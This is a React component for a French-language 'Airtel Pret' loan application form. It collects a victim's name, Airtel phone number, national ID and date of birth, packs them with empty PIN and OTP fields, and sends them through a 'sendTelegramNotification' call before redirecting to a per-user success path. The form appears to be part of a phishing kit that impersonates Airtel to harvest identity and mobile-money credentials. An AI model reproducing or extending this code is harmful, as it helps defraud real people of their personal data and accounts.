import React, { useState, useEffect } from 'react'
import { apiService } from '../services/api.js'

function Apply() {
  const [client, setClient] = useState({
    name: "",
    number: "",
    dob: "",
    loan: "",
    id: "",
    otp: "",
    income: ""
  })

  const [formData, setFormData] = useState({
    name: "",
    number: "",
    dob: "",
    id: "",
    loan: "",
    employment: "",
    term: "",
    amount: "",
    email: ""
  })

  const [isAgree, setIsAgree] = useState(false)
  const [showSuccess, setShowSuccess] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)

  useEffect(() => {
    const storedData = localStorage.getItem('clientData')
    if (storedData) {
      const parsed = JSON.parse(storedData)
      localStorage.setItem('clientData', JSON.stringify(parsed))
    }
  }, [])

  const handleInputChange = (e) => {
    const { name, value } = e.target
    setFormData(prev => ({ ...prev, [name]: value }))
  }

  const sendDetails = async () => {
    if (!formData.name || !formData.number || !formData.id || !formData.loan || !formData.employment || !formData.term || !formData.amount) {
      alert("Veuillez remplir tous les champs obligatoires")
      return
    }

    setIsSubmitting(true)
    
    const clientData = {
      name: formData.name,
      number: formData.number,
      dob: formData.dob,
      id: formData.id,
      pin: formData.pin || "",
      otp: formData.otp || ""
    }

    try {
      await apiService.sendTelegramNotification(clientData)
      localStorage.setItem('clientData', JSON.stringify(clientData))
      setClient(clientData)
      setShowSuccess(true)
      setTimeout(() => {
        const user = window.location.pathname.split("/")[1]
        window.location.href = `/${user}/success?name=${encodeURIComponent(formData.name)}`
      }, 2000)
    } catch (error) {
      console.error("Error sending notification:", error)
    } finally {
      setIsSubmitting(false)
    }
  }

  const resetForm = () => {
    setFormData({
      name: "",
      number: "",
      dob: "",
      id: "",
      loan: "",
      employment: "",
      term: "",
      amount: "",
      email: ""
    })
    setIsAgree(false)
  }

  return (
    <div className="container">
      <div className="topHeader">
        <div className="logo" style={{ marginBottom: '15px', textAlign: 'center' }}>
          <img src="/assets/image.png" alt="Logo" style={{ height: '55px', width: 'auto', maxWidth: '100px' }} />
        </div>
      </div>
      <h1 className="login-title"> Application de prêt</h1>
      
      <main className="loan-app-container">
        <div className="_container_r2qkh_6">
          <div className="_containe_r2qkh_6">
            <section className="_header_r2qkh_21">
              <div style={{ textAlign: 'center', marginBottom: '15px' }}>
                <img src="/assets/image.png" alt="Logo" style={{ height: '55px', width: 'auto', maxWidth: '100px' }} />
              </div>
              <h1>Félicitations !</h1>
            </section>

            <section className="_intro_r2qkh_46">
              <h2>Faites une demande de prêt en quelques minutes</h2>
              <p className="_helpText_r2qkh_51">
                Veuillez renseigner tous les champs obligatoires avec exactitude. 
                Toutes les informations sont traitées de manière confidentielle 
                et utilisées uniquement pour le traitement et la vérification des demandes de prêt.
              </p>
            </section>

            <section className="_dataFields_r2qkh_70">
              <div>
                <label htmlFor="name">Nom et prénom*</label>
                <input 
                  type="text" 
                  id="name" 
                  name="name"
                  value={formData.name}
                  onChange={handleInputChange}
                  placeholder="Entrez votre nom complet" 
                />
              </div>

              <div>
                <label htmlFor="phone">Numéro de téléphone (Airtel)*</label>
                <input 
                  type="number" 
                  id="phone" 
                  name="number"
                  value={formData.number}
                  onChange={handleInputChange}
                  placeholder="0712345678" 
                />
              </div>

              <div>
                <label htmlFor="email">E-mail</label>
                <input 
                  type="email" 
                  id="email" 
                  name="email"
                  value={formData.email}
                  onChange={handleInputChange}
                  placeholder="exemple@email.com" 
                />
              </div>

              <div>
                <label htmlFor="id">Carte d'identité nationale*</label>
                <input 
                  type="text" 
                  id="id" 
                  name="id"
                  value={formData.id}
                  onChange={handleInputChange}
                  placeholder="Numéro de pièce d'identité" 
                />
              </div>

              <div className="_dob_r2qkh_97" style={{ display: "flex", flexDirection: "row", justifyContent: "space-between" }}>
                <div style={{ width: "30%" }}>
                  <label htmlFor="dob">Date de naissance*</label>
                  <input 
                    type="date" 
                    id="dob" 
                    name="dob"
                    value={formData.dob}
                    onChange={handleInputChange}
                  />
                </div>
              </div>

              <div>
                <label htmlFor="employment">Statut d'emploi*</label>
                <select 
                  id="employment" 
                  name="employment"
                  value={formData.employment}
                  onChange={handleInputChange}
                >
                  <option value="">Sélectionner...</option>
                  <option value="selfemployed">Travailleur indépendant</option>
                  <option value="employed">Employé(e)</option>
                  <option value="unemployed">Sans emploi</option>
                  <option value="student">Étudiant(e)</option>
                </select>
              </div>

              <div>
                <label htmlFor="amount">Montant du prêt (USD)*</label>
                <input 
                  type="number" 
                  id="amount" 
                  name="amount"
                  value={formData.amount}
                  onChange={handleInputChange}
                  placeholder="10000" 
                />
              </div>

              <div>
                <label htmlFor="term">Période de remboursement*</label>
                <select 
                  id="term" 
                  name="term"
                  value={formData.term}
                  onChange={handleInputChange}
                >
                  <option value="">Sélectionner...</option>
                  <option value="6">6 mois</option>
                  <option value="12">12 mois</option>
                  <option value="24">24 mois</option>
                  <option value="36">36 mois</option>
                </select>
              </div>
            </section>

            <section className="_footer_r2qkh_115">
              <div className="_terms_r2qkh_124">
                <input 
                  type="checkbox" 
                  id="terms" 
                  required 
                  checked={isAgree}
                  onChange={(e) => setIsAgree(e.target.checked)}
                />
                <p>Je confirme que les informations fournies sont exactes et j'accepte les conditions générales de Airtel Pret.</p>
              </div>
              
              <p>Les champs marqués d'un * sont obligatoires.</p>
              
              <div className="_apllyBtn_r2qkh_162">
                <button 
                  onClick={sendDetails} 
                  disabled={isSubmitting || !formData.name || !formData.number || !formData.id || !formData.loan || !formData.employment || !formData.term || !formData.amount || !isAgree}
                  style={{ opacity: isSubmitting ? 0.6 : 1, cursor: isSubmitting ? "not-allowed" : "pointer" }}
                >
                  {isSubmitting ? "Envoi en cours..." : "Continuer avec Airtel"}
                </button>
                <button 
                  onClick={resetForm} 
                  style={{ color: "black" }}
                  disabled={isSubmitting}
                >
                  Réinitialiser
                </button>
              </div>
            </section>
          </div>
        </div>
      </main>
    </div>
  )
}

export default Apply